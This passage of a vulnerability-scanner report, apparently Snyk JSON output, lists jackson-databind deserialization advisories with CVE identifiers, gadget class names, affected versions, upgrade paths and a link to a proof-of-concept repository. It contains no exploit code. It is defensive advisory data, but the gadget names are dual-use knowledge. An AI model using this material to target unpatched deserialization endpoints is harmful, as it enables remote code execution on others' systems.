WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/840eae2ca81c597a0010b2126f32dce17d384b70)\n- [Github Issue](https://github.com/FasterXML/jackson-databind/issues/2704)\n",
      "disclosureTime": "2020-05-01T15:36:06Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-570625",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-c265-37vj-cwcc"
        ],
        "CVE": [
          "CVE-2020-14062"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:46.643438Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-05-29T15:36:05Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/840eae2ca81c597a0010b2126f32dce17d384b70"
        },
        {
          "title": "Github Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2704"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-06-14T14:48:40.820120Z",
      "credit": [
        "Al1ex@knownsec"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.jsecurity.realm.jndi.JndiRealmFactory`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/f6d9c664f6d481703138319f6a0f1fdbddb3a259)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2765)\n",
      "disclosureTime": "2020-06-14T14:45:09Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.5)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572300",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mc6h-4qgp-37qh"
        ],
        "CVE": [
          "CVE-2020-14195"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:46.867601Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-14T15:32:14Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/f6d9c664f6d481703138319f6a0f1fdbddb3a259"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2765"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.5)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-06-15T10:29:46.691157Z",
      "credit": [
        "Topsec"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible to conduct a Deserialization attack using the `oadd.org.apache.xalan.lib.sql.JNDIConnectionPool`  (`apache/drill`) class gadget if polymorphic type handling is enabled and an application using this package allows user input which gets deserialized. \r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/d1c67a0396e84c08d0558fbb843b5bd1f26e1921)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2688)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-06-15T10:23:33Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572314",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-j823-4qch-3rgm"
        ],
        "CVE": [
          "CVE-2020-14060"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:46.779453Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-15T15:46:13Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/d1c67a0396e84c08d0558fbb843b5bd1f26e1921"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2688"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-06-15T11:03:46.232208Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible to conduct a Deserialization attack using any of the following class gadget available within `weblogic/oracle-aqjms` if polymorphic type handling is enabled and an application using this package allows user input which gets deserialized. \r\n\r\n* oracle.jms.AQjmsQueueConnectionFactory\r\n* oracle.jms.AQjmsXATopicConnectionFactory\r\n* oracle.jms.AQjmsTopicConnectionFactory\r\n* oracle.jms.AQjmsXAQueueConnectionFactory\r\n* oracle.jms.AQjmsXAConnectionFactory\r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2698)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-06-15T10:59:39Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572316",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-c2q3-4qrh-fm48"
        ],
        "CVE": [
          "CVE-2020-14061"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:46.536621Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-15T15:45:37Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2698"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-08-26T11:28:06.617646Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `br.com.anteros.dbcp.AnterosDBCPDataSource` (aka Anteros-DBCP).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.6 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2814)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Kamimuka/cve-2020-24616-poc)\n",
      "disclosureTime": "2020-08-26T11:26:14Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java",
            "className": "SubTypeValidator",
            "functionName": "validateSubType"
          },
          "version": [
            "[2.9.4,2.9.10.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-24616"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T15:50:54.814476Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-08-26T14:27:29Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2814"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Kamimuka/cve-2020-24616-poc"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator",
            "functionName": "validateSubType"
          },
          "version": [
            "[2.9.4,2.9.10.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.6"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:11:34.234921Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attack, if the user is handling untrusted content or using the `Default Typing` feature.  an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-12022`) is not identical to `CVE-2018-12018`,`CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14723` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.4, 2.8.11.2, 2.9.6 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/7487cf7eb14be2f65a1eb108e8629c07ef45e0a1)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2052)\n",
      "disclosureTime": "2018-05-29T17:00:04Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.4",
        "2.8.11.2",
        "2.9.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72445",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-wrr7-33fx-rcvj",
          "GHSA-cjjf-94ff-43w7"
        ],
        "CVE": [
          "CVE-2018-12022"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:22.020113Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:00:03Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/7487cf7eb14be2f65a1eb108e8629c07ef45e0a1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2052"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.4)",
          "[2.8.0,2.8.11.2)",
          "[2.9.0,2.9.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.6"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:14:00.916831Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
